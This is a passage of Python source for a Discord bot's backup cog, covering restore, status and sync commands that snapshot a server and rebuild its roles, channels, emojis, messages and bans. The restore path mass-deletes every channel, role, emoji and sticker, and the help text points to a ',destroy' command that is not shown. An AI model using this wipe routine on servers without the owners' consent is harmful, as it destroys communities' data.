                    await asyncio.sleep(0.2)
                except Exception:
                    pass

        #  STEP 6 — CHANNEL PERMISSIONS (second pass to guarantee all overwrites land)
        await _upd(f"🔒 {restored} channels — fixing permissions…", 48)

        async def _fix_ch_perms(ch_data):
            ch = ch_name_map.get(ch_data["name"])
            if not ch:
                return
            ow = build_overwrites(ch_data)
            if not ow:
                return
            try:
                await ch.edit(overwrites=ow)
            except Exception:
                pass

        await asyncio.gather(*[_fix_ch_perms(cd) for cd in _chs], return_exceptions=True)

        #  STEP 7 — SERVER SETTINGS (name, icon, description, moderation settings)
        await _upd("🏠 Restoring server settings…", 55)
        try:
            edit_kw: dict = {"name": snapshot.get("guild_name") or guild.name}

            # Icon
            icon_url = snapshot.get("guild_icon_url")
            if icon_url:
                async with aiohttp.ClientSession() as _sess:
                    async with _sess.get(icon_url) as resp:
                        if resp.status == 200:
                            edit_kw["icon"] = await resp.read()

            # Description
            if snapshot.get("guild_description"):
                edit_kw["description"] = snapshot["guild_description"]

            # Moderation & notification settings
            vl = snapshot.get("verification_level")
            if vl is not None:
                try:
                    edit_kw["verification_level"] = discord.VerificationLevel(vl)
                except Exception:
                    pass

            ecf = snapshot.get("explicit_content_filter")
            if ecf is not None:
                try:
                    edit_kw["explicit_content_filter"] = discord.ContentFilter(ecf)
                except Exception:
                    pass

            dn = snapshot.get("default_notifications")
            if dn is not None:
                try:
                    edit_kw["default_notifications"] = discord.NotificationLevel(dn)
                except Exception:
                    pass

            if snapshot.get("afk_timeout"):
                edit_kw["afk_timeout"] = snapshot["afk_timeout"]

            if snapshot.get("afk_channel"):
                afk_ch = discord.utils.get(guild.voice_channels, name=snapshot["afk_channel"])
                if afk_ch:
                    edit_kw["afk_channel"] = afk_ch

            if snapshot.get("system_channel"):
                sys_ch = discord.utils.get(guild.text_channels, name=snapshot["system_channel"])
                if sys_ch:
                    edit_kw["system_channel"] = sys_ch

            await guild.edit(**edit_kw)
        except Exception:
            pass

        #  STEP 8 — MESSAGES (concurrent across channels, ordered within each)
        messages_restored = 0
        messages_data     = snapshot.get("messages", {})
        _total_msgs       = sum(len(v) for v in messages_data.values())
        await _upd(f"💬 Restoring {_total_msgs} messages…", 60)

        async def _restore_channel_msgs(ch_name, msgs):
            ch = ch_name_map.get(ch_name)
            if not ch:
                return 0
            count = 0
            for m in msgs:
                try:
                    ts = m.get("timestamp", "")[:19].replace("T", " ")
                    e  = discord.Embed(color=0x2C2F33)
                    e.set_author(name=m.get("author", "Unknown"), icon_url=m.get("avatar") or discord.Embed.Empty)
                    if m.get("content"):
                        e.description = m["content"]
                    if m.get("embed_title") or m.get("embed_description"):
                        e.add_field(name=m.get("embed_title") or "Embed", value=m.get("embed_description") or "—", inline=False)
                    if m.get("attachments"):
                        e.add_field(name="📎 Attachments", value="\n".join(m["attachments"]), inline=False)
                    e.set_footer(text=f"📅 {ts}")
                    await ch.send(embed=e)
                    count += 1
                except Exception:
                    pass
            return count

        msg_counts = await asyncio.gather(
            *[_restore_channel_msgs(ch_name, msgs) for ch_name, msgs in messages_data.items()],
            return_exceptions=True
        )
        messages_restored = sum(c for c in msg_counts if isinstance(c, int))

        #  STEP 9 — EMOJIS & STICKERS (concurrent downloads + uploads)
        emojis_restored   = 0
        stickers_restored = 0
        _emojis   = snapshot.get("emojis", [])
        _stickers = snapshot.get("stickers", [])
        await _upd(f"😀 Restoring {len(_emojis)} emojis & {len(_stickers)} stickers…", 75)

        async def _restore_emoji(session, ed):
            try:
                async with session.get(ed["url"]) as resp:
                    if resp.status == 200:
                        img = await resp.read()
                        await guild.create_custom_emoji(name=ed["name"], image=img)
                        return True
            except Exception:
                pass
            return False

        async def _restore_sticker(session, sd):
            try:
                async with session.get(sd["url"]) as resp:
                    if resp.status == 200:
                        img = await resp.read()
                        await guild.create_sticker(
                            name=sd["name"], description=sd["name"], emoji="⭐",
                            file=discord.File(fp=__import__("io").BytesIO(img), filename="sticker.png"),
                        )
                        return True
            except Exception:
                pass
            return False

        async with aiohttp.ClientSession() as session:
            emoji_flags   = await asyncio.gather(*[_restore_emoji(session, ed)   for ed in _emojis],   return_exceptions=True)
            sticker_flags = await asyncio.gather(*[_restore_sticker(session, sd) for sd in _stickers], return_exceptions=True)
        emojis_restored   = sum(1 for f in emoji_flags   if f is True)
        stickers_restored = sum(1 for f in sticker_flags if f is True)

        #  STEP 10 — DISTRIBUTE ROLES TO MEMBERS
        await _upd("👥 Distributing roles to members…", 88)
        member_roles_data = snapshot.get("member_roles", {})

        async def _assign_roles(member):
            names = member_roles_data.get(str(member.id), [])
            give  = [role_name_map[n] for n in names if n in role_name_map]
            if give:
                try:
                    await member.add_roles(*give, reason="Backup restore")
                except Exception:
                    pass

        await asyncio.gather(*[_assign_roles(m) for m in guild.members], return_exceptions=True)

        #  BANS
        bans_restored = 0
        _bans = snapshot.get("bans", [])
        await _upd(f"🔨 Restoring {len(_bans)} bans…", 95)
        try:
            already_banned = {str(be.user.id) async for be in guild.bans()}
        except Exception:
            already_banned = set()

        async def _do_ban(bd):
            uid = bd.get("user_id")
            if not uid or uid in already_banned:
                return False
            try:
                u = await interaction.client.fetch_user(int(uid))
                await guild.ban(u, reason=bd.get("reason") or "Restored from backup", delete_message_days=0)
                return True
            except Exception:
                return False

        ban_flags = await asyncio.gather(*[_do_ban(bd) for bd in _bans], return_exceptions=True)
        bans_restored = sum(1 for f in ban_flags if f is True)

        # ── Store result for /backup status ──
        LAST_RESTORE[guild.id] = {
            "code":        code.strip().upper(),
            "restored_by": str(interaction.user),
            "timestamp":   datetime.now(timezone.utc).isoformat(),
            "roles":       {"restored": roles_restored,   "total": len(_roles),    "names": list(role_name_map.keys())},
            "categories":  {"restored": len(cat_map),     "total": len(_cats),     "names": list(cat_map.keys())},
            "channels":    {"restored": restored,         "total": len(_chs),      "names": list(ch_name_map.keys())},
            "messages":    {"restored": messages_restored,"total": _total_msgs},
            "emojis":      {"restored": emojis_restored,  "total": len(_emojis),   "names": [e["name"] for e in _emojis]},
            "stickers":    {"restored": stickers_restored,"total": len(_stickers), "names": [s["name"] for s in _stickers]},
            "bans":        {"restored": bans_restored,    "total": len(_bans)},
        }

        # ── Announce in first text channel ──
        first_ch = next((ch for ch in guild.text_channels), None)
        if first_ch:
            try:
                await first_ch.send(
                    embed=discord.Embed(
                        title="🐻‍❄️ Restored By Coolbot",
                        description=(
                            f"This server has been restored.\n"
                            f"**Restored by:** {interaction.user.mention} (`{interaction.user}`)"
                        ),
                        color=COLORS["success"]
                    )
                )
            except Exception:
                pass

        # ── Final DM: detailed report ──
        def _chunk_list(items: list, max_chars: int = 900) -> list[str]:
            chunks, current = [], ""
            for item in items:
                line = f"• {item}\n"
                if len(current) + len(line) > max_chars:
                    chunks.append(current)
                    current = line
                else:
                    current += line
            if current:
                chunks.append(current)
            return chunks or ["—"]

        if dm_msg:
            try:
                await dm_msg.edit(
                    embed=discord.Embed(
                        title="✅ Restore Complete!",
                        description=(
                            f"{_bar(100)}\n\n"
                            f"**Server:** {guild.name}\n"
                            f"**Channels:** {restored} · **Categories:** {len(cat_map)}\n"
                            f"**Roles:** {roles_restored} · **Emojis:** {emojis_restored} · **Stickers:** {stickers_restored}\n"
                            f"**Messages replayed:** {messages_restored}\n\n"
                            f"Full breakdown follows below 👇"
                        ),
                        color=COLORS["success"]
                    ).set_footer(text=f"Coolbot • Restored by {interaction.user}")
                )
            except Exception:
                pass

        if caller:
            try:
                cat_names  = list(cat_map.keys()) or ["None"]
                ch_names   = list(ch_name_map.keys()) or ["None"]
                cat_chunks = _chunk_list(cat_names)
                ch_chunks  = _chunk_list(ch_names)

                e_struct = discord.Embed(
                    title="📁 Categories & Channels Added",
                    color=COLORS["info"]
                ).set_footer(text=f"Coolbot • {guild.name} restore report")
                e_struct.add_field(name=f"📂 Categories ({len(cat_map)})", value=cat_chunks[0], inline=False)
                for extra in cat_chunks[1:]:
                    e_struct.add_field(name="📂 (cont.)", value=extra, inline=False)
                e_struct.add_field(name=f"💬 Channels ({len(ch_name_map)})", value=ch_chunks[0], inline=False)
                for extra in ch_chunks[1:]:
                    e_struct.add_field(name="💬 (cont.)", value=extra, inline=False)
                await caller.send(embed=e_struct)

                role_names  = list(role_name_map.keys()) or ["None"]
                role_chunks = _chunk_list(role_names)
                e_roles = discord.Embed(
                    title=f"🎭 Roles Added ({roles_restored})",
                    color=COLORS["main"]
                ).set_footer(text=f"Coolbot • {guild.name} restore report")
                e_roles.add_field(name="Roles created", value=role_chunks[0], inline=False)
                for extra in role_chunks[1:]:
                    e_roles.add_field(name="(cont.)", value=extra, inline=False)
                await caller.send(embed=e_roles)

                emoji_names   = [ed["name"] for ed in _emojis] or ["None"]
                sticker_names = [sd["name"] for sd in _stickers] or ["None"]
                e_media = discord.Embed(
                    title="😀 Emojis & Stickers Restored",
                    color=COLORS["main"]
                ).set_footer(text=f"Coolbot • {guild.name} restore report")
                e_media.add_field(
                    name=f"Emojis ({emojis_restored})",
                    value="\n".join(f"• :{n}:" for n in emoji_names[:30]) + ("\n…and more" if len(emoji_names) > 30 else "") or "—",
                    inline=True
                )
                e_media.add_field(
                    name=f"Stickers ({stickers_restored})",
                    value="\n".join(f"• {n}" for n in sticker_names[:20]) + ("\n…and more" if len(sticker_names) > 20 else "") or "—",
                    inline=True
                )
                await caller.send(embed=e_media)

                msg_channel_lines = [
                    f"#{ch_name} — {len(msgs)} msg(s)"
                    for ch_name, msgs in messages_data.items() if msgs
                ] or ["No messages restored"]
                msg_chunks = _chunk_list(msg_channel_lines)
                e_msgs = discord.Embed(
                    title=f"💬 Messages Replayed ({messages_restored} total)",
                    color=COLORS["dark"]
                ).set_footer(text=f"Coolbot • {guild.name} restore report")
                e_msgs.add_field(name="Channels with replayed messages", value=msg_chunks[0], inline=False)
                for extra in msg_chunks[1:]:
                    e_msgs.add_field(name="(cont.)", value=extra, inline=False)
                await caller.send(embed=e_msgs)

            except Exception:
                pass

        await interaction.followup.send(
            embed=discord.Embed(
                title="✅ Backup Restored",
                description=(
                    f"Recreated **{restored}** channel(s) and **{len(cat_map)}** categor(ies)\n"
                    f"Roles: **{roles_restored}** · Emojis: **{emojis_restored}** · Stickers: **{stickers_restored}**\n"
                    f"Messages: **{messages_restored}** restored\n\n"
                    f"**Restored by:** {interaction.user} (`{interaction.user.id}`)\n"
                    f"Check your DMs for the full breakdown."
                ),
                color=COLORS["success"]
            ).set_footer(text=f"Coolbot  •  Restored by {interaction.user}"),
            ephemeral=False
        )

    # ──────────────────────────────────────────────────────────────────────────
    #  ,backupload <code> [skip_roles]
    #  Prefix version of /backup load — works exactly like Xenon/MySetup
    # ──────────────────────────────────────────────────────────────────────────
    @commands.command(name="backupload", aliases=["bloat", "brestore"])
    async def backupload_prefix(self, ctx: commands.Context, code: str = "", *, flags: str = ""):
        """Restore a server backup by code — ,backupload <code> [--skip-roles]"""
        if not has_owner_access(ctx.author):
            return await ctx.send(
                embed=discord.Embed(
                    description="❌ **Premium** access required to use `,backupload`.",
                    color=COLORS["error"]
                )
            )
        if not code:
            e = discord.Embed(
                title="📦  backupload — Usage",
                description=(
                    "```\n"
                    ",backupload <code>\n"
                    ",backupload <code> --skip-roles\n"
                    "```\n"
                    "Restores a server snapshot created by `,destroy` or `/backup load`.\n\n"
                    "**Flags**\n"
                    "`--skip-roles` — recreate channels + settings only, leave roles alone"
                ),
                color=COLORS["info"]
            )
            e.set_footer(text="Coolbot  •  backup codes are in your DMs after a ,destroy")
            return await ctx.send(embed=e)

        skip_roles = "--skip-roles" in flags.lower() or "--skiproles" in flags.lower()
        code_up    = code.strip().upper()
        backup_path = os.path.join("backups", f"{code_up}.json.gz")

        if not os.path.exists(backup_path):
            return await ctx.send(
                embed=discord.Embed(
                    title="❌  Backup Not Found",
                    description=(
                        f"No backup file found for code **`{code_up}`**.\n\n"
                        "Make sure:\n"
                        "• The bot is running on the same machine where `,destroy` was used\n"
                        "• The code is correct (check your DMs)"
                    ),
                    color=COLORS["error"]
                )
            )

        try:
            with open(backup_path, "rb") as f:
                raw = gzip.decompress(f.read())
            snapshot = json.loads(raw.decode())
        except Exception as ex:
            return await ctx.send(
                embed=discord.Embed(
                    description=f"❌ Failed to read backup file: `{ex}`",
                    color=COLORS["error"]
                )
            )

        guild = ctx.guild

        # ── Verification gate before destructive restore ─────────────────────
        # Prevents accidental restores and false-nuke recovery actions.
        class _BackupConfirmView(discord.ui.View):
            def __init__(self):
                super().__init__(timeout=60)
                self.confirmed = False
                self.cancelled = False

            @discord.ui.button(label="✅ Confirm Restore", style=discord.ButtonStyle.danger)
            async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
                if interaction.user.id != ctx.author.id:
                    return await interaction.response.send_message("Only the requester can confirm.", ephemeral=True)
                self.confirmed = True
                self.stop()
                await interaction.response.edit_message(
                    embed=discord.Embed(
                        title="⏳ Restore approved — starting…",
                        description="Do not run another restore while this is in progress.",
                        color=COLORS["warn"],
                    ),
                    view=None,
                )

            @discord.ui.button(label="❌ Cancel", style=discord.ButtonStyle.secondary)
            async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
                if interaction.user.id != ctx.author.id:
                    return await interaction.response.send_message("Only the requester can cancel.", ephemeral=True)
                self.cancelled = True
                self.stop()
                await interaction.response.edit_message(
                    embed=discord.Embed(description="❎ Backup restore cancelled. No changes were made.", color=COLORS["info"]),
                    view=None,
                )

        ch_count = len(snapshot.get("channels") or [])
        role_count = len(snapshot.get("roles") or [])
        confirm_embed = discord.Embed(
            title="⚠️ Confirm Backup Restore",
            description=(
                f"**Server:** {guild.name} (`{guild.id}`)\n"
                f"**Backup code:** `{code_up}`\n"
                f"**Snapshot:** {ch_count} channels · {role_count} roles\n"
                f"**Skip roles:** {'yes' if skip_roles else 'no'}\n\n"
                "This will **overwrite** current channels/roles with the backup.\n"
                "Only confirm if you verified a real destructive incident.\n"
                "Expires in **60 seconds**."
            ),
            color=0xFF4500,
        )
        confirm_embed.set_footer(text="Mikasa Anti-Nuke · verified recovery gate")
        view = _BackupConfirmView()
        await ctx.send(embed=confirm_embed, view=view)
        await view.wait()
        if not view.confirmed or view.cancelled:
            if not view.cancelled:
                try:
                    await ctx.send(embed=discord.Embed(description="⏱️ Restore confirmation timed out. No changes made.", color=COLORS["warn"]))
                except Exception:
                    pass
            return

        # Notify primary owner of authorized restore
        try:
            owner = await ctx.bot.fetch_user(OWNER_ID)
            await owner.send(embed=discord.Embed(
                title="🗄️ Backup Restore Started",
                description=(
                    f"**By:** {ctx.author} (`{ctx.author.id}`)\n"
                    f"**Server:** {guild.name} (`{guild.id}`)\n"
                    f"**Code:** `{code_up}`\n"
                    f"**Skip roles:** {skip_roles}"
                ),
                color=COLORS["warn"],
            ))
        except Exception:
            pass

        # ── Pretty progress bar (like Xenon/MySetup) ──────────────────────────
        def _bar(pct: int) -> str:
            filled = round(pct / 10)
            empty  = 10 - filled
            block  = "🟥" if pct <= 33 else ("🟨" if pct <= 66 else "🟩")
            return f"{block * filled}{'⬛' * empty}  **{pct}%**"

        def _bar_color(pct: int) -> int:
            if pct <= 33:  return COLORS["error"]
            if pct <= 66:  return COLORS["warn"]
            return COLORS["success"]

        def _make_embed(stage: str, pct: int) -> discord.Embed:
            return discord.Embed(
                title="🔄  Restoring Backup…",
                description=(
                    f"{_bar(pct)}\n\n"
                    f"**Stage:** {stage}\n"
                    f"**Server:** {guild.name}\n"
                    f"**Code:** `{code_up}`"
                    + (f"\n**Skip roles:** yes" if skip_roles else "")
                ),
                color=_bar_color(pct)
            ).set_footer(text="Coolbot  •  Do not leave the server during restore")

        try:
            await ctx.message.delete()
        except Exception:
            pass

        prog_msg = await ctx.send(embed=_make_embed("Initializing…", 0))

        async def _upd(stage: str, pct: int):
            try:
                await prog_msg.edit(embed=_make_embed(stage, pct))
            except Exception:
                pass

        # ── STEP 1 — Wipe channels ─────────────────────────────────────────────
        await _upd("🗑️  Wiping channels…", 2)
        for _ in range(2):
            chs = list(guild.channels)
            if chs:
                await asyncio.gather(*[c.delete() for c in chs], return_exceptions=True)
            await asyncio.sleep(0.5)

        # ── STEP 2 — Wipe roles ────────────────────────────────────────────────
        await _upd("🗑️  Wiping roles…", 6)
        for _pass in range(4):
            droles = [r for r in guild.roles if not r.is_default() and r < guild.me.top_role]
            if not droles:
                break
            await asyncio.gather(*[r.delete() for r in droles], return_exceptions=True)
            await asyncio.sleep(0.6)

        # Wipe emojis + stickers
        for _ in range(2):
            if guild.emojis:
                await asyncio.gather(*[guild.delete_emoji(e) for e in list(guild.emojis)], return_exceptions=True)
        for _ in range(2):
            if guild.stickers:
                await asyncio.gather(*[guild.delete_sticker(s) for s in list(guild.stickers)], return_exceptions=True)

        await _upd("✅  Wipe complete — creating roles…", 10)

        # ── STEP 3 — Roles (Xenon-style sequential) ───────────────────────────
        roles_restored = 0
        role_name_map: dict = {}
        name_pos_role: list = []
        for r in guild.roles:
            role_name_map[r.name] = r

        if skip_roles:
            await _upd("⏭️  Skipping roles (--skip-roles)…", 25)
            _roles = []
        else:
            _roles = sorted(
                [rd for rd in snapshot.get("roles", []) if not rd.get("managed", False)],
                key=lambda x: x.get("position", 0), reverse=True
            )
            await _upd(f"🎭  Creating {len(_roles)} roles…", 10)
            for i, rd in enumerate(_roles):
                pct = 10 + int(((i + 1) / max(len(_roles), 1)) * 15)
                for attempt in range(5):
                    try:
                        r = await guild.create_role(
                            name=rd["name"],
                            color=discord.Color(rd.get("color", 0)),
                            hoist=rd.get("hoist", False),
                            mentionable=rd.get("mentionable", False),
                            permissions=discord.Permissions(rd.get("permissions", 0)),
                            reason="Coolbot backup restore",
                        )
                        role_name_map[rd["name"]] = r
                        name_pos_role.append((rd["name"], rd.get("position", 0), r))
                        roles_restored += 1
                        await asyncio.sleep(0.6)
                        break
                    except discord.HTTPException as e:
                        if e.status == 429:
                            await asyncio.sleep(float(getattr(e, "retry_after", 2)) + 1.0)
                        elif e.status in (403, 400):
                            break
                        else:
                            await asyncio.sleep(2.0 * (attempt + 1))
                    except Exception:
                        await asyncio.sleep(2.0 * (attempt + 1))
                if i % 5 == 0:
                    await _upd(f"🎭  Roles {i+1}/{len(_roles)} — {roles_restored} created", pct)

        # Fix role hierarchy
        if name_pos_role:
            sorted_desc = sorted(name_pos_role, key=lambda x: x[1], reverse=True)
            max_p = len(sorted_desc)
            positions = {entry[2]: max_p - idx for idx, entry in enumerate(sorted_desc)}
            for _a in range(4):
                try:
                    await guild.edit_role_positions(positions=positions)
                    break
                except Exception:
                    await asyncio.sleep(2.0 * (_a + 1))

        # ── STEP 4 — Categories ───────────────────────────────────────────────
        await _upd("📁  Creating categories…", 30)
        cat_map: dict = {}
        _cats = sorted(snapshot.get("categories", []), key=lambda x: x.get("position", 0))
        for i, cd in enumerate(_cats):
            try:
                existing = discord.utils.get(guild.categories, name=cd["name"])
                if existing:
                    cat_map[cd["name"]] = existing
                else:
                    c = await guild.create_category(cd["name"])
                    cat_map[cd["name"]] = c
                    await asyncio.sleep(0.3)
            except Exception:
                pass
        for i, cd in enumerate(_cats):
            obj = cat_map.get(cd["name"])
            if obj:
                try:
                    await obj.edit(position=i)
                    await asyncio.sleep(0.15)
                except Exception:
                    pass

        # ── STEP 5 — Channels ────────────────────────────────────────────────
        await _upd("💬  Creating channels…", 40)
        ch_name_map: dict = {}
        restored = 0
        _chs = sorted(
            [c for c in snapshot.get("channels", []) if c.get("type") != "category"],
            key=lambda x: x.get("position", 0)
        )

        async def _make_ch(ch_data):
            t = ch_data.get("type", "text")
            cat = cat_map.get(ch_data.get("category")) if ch_data.get("category") else None
            try:
                if "voice" in t:
                    ch = await guild.create_voice_channel(ch_data["name"], category=cat)
                elif "stage" in t:
                    ch = await guild.create_stage_channel(ch_data["name"], category=cat)
                elif "forum" in t:
                    return ch_data["name"], None
                else:
                    ch = await guild.create_text_channel(
                        ch_data["name"],
                        topic=ch_data.get("topic") or "",
                        category=cat,
                    )
                return ch_data["name"], ch
            except Exception:
                return ch_data["name"], None

        ch_results = await asyncio.gather(*[_make_ch(cd) for cd in _chs])
        for name, obj in ch_results:
            if obj:
                ch_name_map[name] = obj
                restored += 1

        # ── STEP 6 — Server settings (name + icon) ───────────────────────────
        await _upd("🏠  Restoring server name & icon…", 60)
        try:
            edit_kw: dict = {"name": snapshot.get("guild_name") or guild.name}
            icon_url = snapshot.get("guild_icon_url")
            if icon_url:
                async with aiohttp.ClientSession() as _sess:
                    async with _sess.get(icon_url) as resp:
                        if resp.status == 200:
                            edit_kw["icon"] = await resp.read()
            await guild.edit(**edit_kw)
        except Exception:
            pass

        # ── STEP 7 — Emojis ──────────────────────────────────────────────────
        _emojis_data = snapshot.get("emojis", [])
        await _upd(f"😀  Restoring {len(_emojis_data)} emojis…", 70)
        emojis_restored = 0
        async with aiohttp.ClientSession() as _sess:
            for ed in _emojis_data:
                try:
                    async with _sess.get(ed["url"]) as resp:
                        if resp.status == 200:
                            img = await resp.read()
                            await guild.create_custom_emoji(name=ed["name"], image=img)
                            emojis_restored += 1
                            await asyncio.sleep(1.0)
                except Exception:
                    pass

        # ── STEP 8 — Stickers ────────────────────────────────────────────────
        _stickers_data = snapshot.get("stickers", [])
        await _upd(f"🎟️  Restoring {len(_stickers_data)} stickers…", 82)
        stickers_restored = 0
        async with aiohttp.ClientSession() as _sess:
            for sd in _stickers_data:
                try:
                    async with _sess.get(sd["url"]) as resp:
                        if resp.status == 200:
                            img = await resp.read()
                            await guild.create_sticker(
                                name=sd["name"], description=sd["name"], emoji="⭐",
                                file=discord.File(fp=__import__("io").BytesIO(img), filename="sticker.png"),
                            )
                            stickers_restored += 1
                            await asyncio.sleep(1.5)
                except Exception:
                    pass

        # ── STEP 9 — Distribute roles to members ─────────────────────────────
        await _upd("👥  Distributing roles to members…", 92)
        member_roles_data = snapshot.get("member_roles", {})
        async def _assign(member):
            names_list = member_roles_data.get(str(member.id), [])
            give = [role_name_map[n] for n in names_list if n in role_name_map]
            if give:
                try:
                    await member.add_roles(*give, reason="Backup restore")
                except Exception:
                    pass
        await asyncio.gather(*[_assign(m) for m in guild.members], return_exceptions=True)

        # ── Done ─────────────────────────────────────────────────────────────
        await _upd("✅  Restore complete!", 100)

        summary = discord.Embed(
            title="✅  Backup Restored",
            description=(
                f"**Code:** `{code_up}`\n"
                f"**Server:** {guild.name}\n\n"
                f"📂 Categories — **{len(cat_map)}** restored\n"
                f"💬 Channels — **{restored}** restored\n"
                f"🎭 Roles — **{roles_restored}** restored\n"
                f"😀 Emojis — **{emojis_restored}** restored\n"
                f"🎟️ Stickers — **{stickers_restored}** restored"
            ),
            color=COLORS["success"]
        )
        summary.set_footer(text=f"Coolbot  •  Restored by {ctx.author}")
        try:
            await prog_msg.edit(embed=summary)
        except Exception:
            await ctx.send(embed=summary)

        # DM the owner a report too
        try:
            owner_user = await ctx.bot.fetch_user(OWNER_ID)
            await owner_user.send(embed=summary)
        except Exception:
            pass

    @backup_group.command(name="status", description="Show the result of the last /backup load in this server")
    async def backup_status(self, interaction: discord.Interaction):
        is_allowed = has_owner_access(interaction.user)
        if not is_allowed:
            await interaction.response.send_message(
                embed=discord.Embed(description="❌ You don't have permission to use `/backup status`.", color=COLORS["error"]),
                ephemeral=False
            )
            return

        data = LAST_RESTORE.get(interaction.guild_id)
        if not data:
            await interaction.response.send_message(
                embed=discord.Embed(description="ℹ️ No restore has been run in this server yet.", color=COLORS["info"]),
                ephemeral=False
            )
            return

        ts = data["timestamp"][:19].replace("T", " ")
        r  = data["roles"]
        ca = data["categories"]
        ch = data["channels"]
        em = data["emojis"]
        st = data["stickers"]
        ms = data["messages"]
        bn = data["bans"]

        def _stat(restored: int, total: int) -> str:
            if total == 0:
                return "✅ None needed"
            icon = "✅" if restored == total else ("⚠️" if restored > 0 else "❌")
            return f"{icon} {restored}/{total}"

        issues = []
        if r["total"]  - r["restored"]  > 0: issues.append(f"• **{r['total']  - r['restored']}** role(s) failed")
        if ca["total"] - ca["restored"] > 0: issues.append(f"• **{ca['total'] - ca['restored']}** categor(ies) failed")
        if ch["total"] - ch["restored"] > 0: issues.append(f"• **{ch['total'] - ch['restored']}** channel(s) failed")
        if em["total"] - em["restored"] > 0: issues.append(f"• **{em['total'] - em['restored']}** emoji(s) failed")
        if st["total"] - st["restored"] > 0: issues.append(f"• **{st['total'] - st['restored']}** sticker(s) failed")
        issues_text = "\n".join(issues) if issues else "✅ Everything restored perfectly."

        embed = discord.Embed(
            title="📊 Last Restore Status",
            color=COLORS["success"] if not issues else COLORS["warn"],
        )
        embed.add_field(name="🔑 Code",        value=f"`{data['code']}`",   inline=True)
        embed.add_field(name="👤 Restored By", value=data["restored_by"],   inline=True)
        embed.add_field(name="🕒 Time (UTC)",  value=ts,                     inline=True)
        embed.add_field(name="🎭 Roles",       value=_stat(r["restored"],  r["total"]),  inline=True)
        embed.add_field(name="📁 Categories",  value=_stat(ca["restored"], ca["total"]), inline=True)
        embed.add_field(name="📺 Channels",    value=_stat(ch["restored"], ch["total"]), inline=True)
        embed.add_field(name="💬 Messages",    value=f"{ms['restored']}/{ms['total']}",  inline=True)
        embed.add_field(name="😀 Emojis",      value=_stat(em["restored"], em["total"]), inline=True)
        embed.add_field(name="🪄 Stickers",    value=_stat(st["restored"], st["total"]), inline=True)
        embed.add_field(name="🔨 Bans",        value=f"{bn['restored']}/{bn['total']}",  inline=True)
        embed.add_field(name="⚠️ Issues",      value=issues_text, inline=False)
        embed.set_footer(text="Coolbot • Run /backup load again to re-restore")

        await interaction.response.send_message(embed=embed, ephemeral=False)

    @backup_group.command(name="sync", description="Update an existing backup with the current server state (keeps same code)")
    @app_commands.describe(code="The backup code to overwrite, e.g. PB-A3X9K2")
    async def backup_sync(self, interaction: discord.Interaction, code: str):
        is_allowed = has_owner_access(interaction.user)
        if not is_allowed:
            await interaction.response.send_message(
                embed=discord.Embed(description="❌ You don't have permission to use `/backup sync`.", color=COLORS["error"]),
                ephemeral=False
            )
            return

        backup_path = os.path.join("backups", f"{code.strip().upper()}.json.gz")
        if not os.path.exists(backup_path):
            await interaction.response.send_message(
                embed=discord.Embed(description=f"❌ No backup found for code `{code.strip().upper()}`. Create one first with `/backupcreate`.", color=COLORS["error"]),
                ephemeral=False
            )
            return

        await interaction.response.send_message(
            embed=discord.Embed(title="🔄 Syncing Backup…", description="Check your DMs for live progress.", color=COLORS["warn"]),
            ephemeral=False
        )

        guild  = interaction.guild
        caller = None
        dm_msg = None
        try:
            caller = await interaction.client.fetch_user(interaction.user.id)
            dm_msg = await caller.send(
                embed=discord.Embed(
                    title="🔄 Backup Sync In Progress",
                    description=f"⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛ **0%**\n\n**Stage:** Starting…\n**Server:** {guild.name}\n**Code:** `{code.strip().upper()}`",
                    color=COLORS["warn"]
                ).set_footer(text="Coolbot • This message will update live")
            )
        except Exception:
            pass

        def _bar(pct: int) -> str:
            filled = round(pct / 10)
            return f"{'🟦' * filled}{'⬛' * (10 - filled)} **{pct}%**"

        async def _upd(stage: str, pct: int):
            if not dm_msg:
                return
            try:
                await dm_msg.edit(
                    embed=discord.Embed(
                        title="🔄 Backup Sync In Progress",
                        description=f"{_bar(pct)}\n\n**Stage:** {stage}\n**Server:** {guild.name}\n**Code:** `{code.strip().upper()}`",
                        color=COLORS["warn"]
                    ).set_footer(text="Coolbot • This message will update live")
                )
            except Exception:
                pass

        # ── Re-snapshot the server (identical logic to /backupcreate) ──
        await _upd("📋 Snapshotting server settings…", 5)
        snapshot = {
            "guild_name":        guild.name,
            "guild_icon_url":    str(guild.icon.url)   if guild.icon   else None,
            "guild_banner_url":  str(guild.banner.url) if guild.banner else None,
            "guild_splash_url":  str(guild.splash.url) if guild.splash else None,
            "guild_description": guild.description or "",
            "verification_level":      guild.verification_level.value,
            "explicit_content_filter": guild.explicit_content_filter.value,
            "default_notifications":   guild.default_notifications.value,
            "afk_timeout":             guild.afk_timeout,
            "afk_channel":             guild.afk_channel.name  if guild.afk_channel  else None,
            "system_channel":          guild.system_channel.name if guild.system_channel else None,
            "rules_channel":           guild.rules_channel.name  if guild.rules_channel  else None,
            "preferred_locale":        str(guild.preferred_locale),
            "roles": [], "categories": [], "channels": [],
            "emojis": [], "stickers": [], "member_roles": {}, "messages": {}, "bans": [],
        }

        await _upd("🎭 Snapshotting roles…", 15)
        for role in sorted(guild.roles, key=lambda r: r.position):
            if role.is_default():
                continue
            snapshot["roles"].append({
                "name": role.name, "color": role.color.value, "hoist": role.hoist,
                "mentionable": role.mentionable, "permissions": role.permissions.value,
                "position": role.position, "managed": role.managed,
            })

        await _upd("📁 Snapshotting categories & channels…", 30)

        def _get_overwrites(ch) -> list:
            result = []
            for target, ow in ch.overwrites.items():
                allow, deny = ow.pair()
                result.append({
                    "target_name": target.name,
                    "target_type": "role" if isinstance(target, discord.Role) else "member",
                    "target_id":   str(target.id),
                    "allow":       allow.value,
                    "deny":        deny.value,
                })
            return result

        for cat in sorted(guild.categories, key=lambda c: c.position):
            snapshot["categories"].append({"name": cat.name, "position": cat.position, "overwrites": _get_overwrites(cat)})

        for ch in sorted(guild.channels, key=lambda c: c.position):
            if isinstance(ch, discord.CategoryChannel):
                continue
            snapshot["channels"].append({
                "name": ch.name, "type": str(ch.type), "position": ch.position,
                "category": ch.category.name if ch.category else None,
                "overwrites": _get_overwrites(ch),
                "topic":      getattr(ch, "topic",         None) or "",
                "slowmode":   getattr(ch, "slowmode_delay", None) or 0,
                "nsfw":       getattr(ch, "nsfw",           False),
                "bitrate":    getattr(ch, "bitrate",        64000),
                "user_limit": getattr(ch, "user_limit",     0),
            })

        await _upd("😀 Snapshotting emojis & stickers…", 45)
        for emoji in guild.emojis:
